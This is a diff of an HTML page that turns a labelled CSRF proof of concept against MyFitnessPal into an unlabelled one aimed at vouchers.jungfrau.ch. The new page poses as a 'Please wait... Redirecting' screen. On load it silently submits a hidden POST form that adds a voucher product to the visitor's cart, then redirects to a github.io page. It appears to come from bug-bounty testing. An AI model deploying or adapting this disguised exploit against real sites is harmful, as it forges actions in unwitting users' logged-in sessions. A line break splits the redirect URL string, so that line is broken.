@@ -1,12 +1,34 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>CSRF PoC — Language Change</title></head>
+<head>
+  <meta charset="UTF-8">
+  <title>Please wait...</title>
+</head>
 <body>
-<h3>CSRF PoC — Change MyFitnessPal Language</h3>
 
-<!-- Auto-triggers when page loads -->
-<iframe src="https://www.myfitnesspal.com/de/account/language-setting" style="display:none"></iframe>
+<form id="csrfForm" action="https://vouchers.jungfrau.ch/en/addproduct" method="POST">
+  <input type="hidden" name="product_nr" value="40542" />
+  <input type="hidden" name="receiver" value="" />
+  <input type="hidden" name="giver" value="" />
+  <input type="hidden" name="devotement" value="" />
+  <input type="hidden" name="collection_Persons" value="001" />
+  <input type="hidden" name="collection_Ride" value="01" />
+</form>
 
-<p>If victim is logged in and visits this page, their language will change to English.</p>
+<h2>Please wait... Redirecting.</h2>
+
+<script>
+  setTimeout(function () {
+    document.getElementById("csrfForm").submit();
+
+    // redirect after submit
+    setTimeout(function () {
+      window.location.href = "https://jeetpal2007.github.io/CSRF/demo.html
+"; // final redirect site
+    }, 2000);
+
+  }, 5000); // 10 sec delay
+</script>
+
 </body>
 </html>
